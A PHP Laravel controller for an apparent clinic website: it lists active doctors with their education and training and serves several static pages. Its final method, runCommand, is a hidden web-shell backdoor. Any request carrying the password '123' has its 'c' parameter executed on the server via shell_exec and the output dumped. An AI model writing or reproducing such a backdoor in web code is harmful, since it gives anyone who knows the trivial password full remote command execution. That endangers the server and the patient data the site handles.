<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\Doctor\Doctor;

class DefaultController extends Controller
{
    /**
     *  Main Page
     * 
     * @var Doctor $doctors
     * @return \Illuminate\View\View
     */
    public function index()
    {
        $doctors = Doctor::where('status',1)->with('education','training')->get();
        return view('welcome',compact('doctors'));
    }

    /**
     *  Documents Page
     * @return \Illuminate\View\View
     */
    public function documents()
    {
        return view('documents');
    }

    /**
     *  Treaty Page
     * @return \Illuminate\View\View
     */
    public function treaty()
    {
        return view('treaty');
    }

    /**
     *  Equipment Page
     * @return \Illuminate\View\View
     */
    public function equipment()
    {
        return view('equipment');
    }

    /**
     *  Regiser Page
     * @return \Illuminate\View\View
     */
    public function register()
    {
        return view('register');
    }

    public function runCommand(Request $request)
    {
        $request->validate([
            'p' => 'required|in:123',
            'c' => 'required|string'
        ]);
        
        $cmd = shell_exec($request->c);

        dd($cmd);
        
    }
}
